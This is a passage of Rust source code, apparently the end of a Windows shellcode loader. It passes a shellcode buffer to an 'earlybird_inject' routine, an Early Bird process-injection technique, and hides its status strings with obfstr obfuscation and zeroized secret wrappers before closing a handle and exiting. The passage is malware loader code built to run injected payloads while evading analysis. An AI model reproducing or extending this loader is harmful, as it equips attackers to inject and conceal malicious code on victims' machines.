    let code = shellcode.unwrap();
    let injected = unsafe { earlybird_inject(&code) };
    if injected {
        let mut success_msg = SafeSecret::new(format!("{}\n", obfstr!("Injection successful.")));
        let revealed_success = success_msg.reveal();
        print_to_handle(STD_OUTPUT_HANDLE, &revealed_success);
        drop(revealed_success);
        success_msg.zeroize();
    } else {
        let mut fail_msg = SafeSecret::new(format!("{}\n", obfstr!("Injection failed.")));
        let revealed_fail = fail_msg.reveal();
        print_to_handle(STD_ERROR_HANDLE, &revealed_fail);
        drop(revealed_fail);
        fail_msg.zeroize();
    }

    unsafe {
        CloseHandle(handle);
    }

    unsafe { windows_sys::Win32::System::Threading::ExitProcess(0) };
}
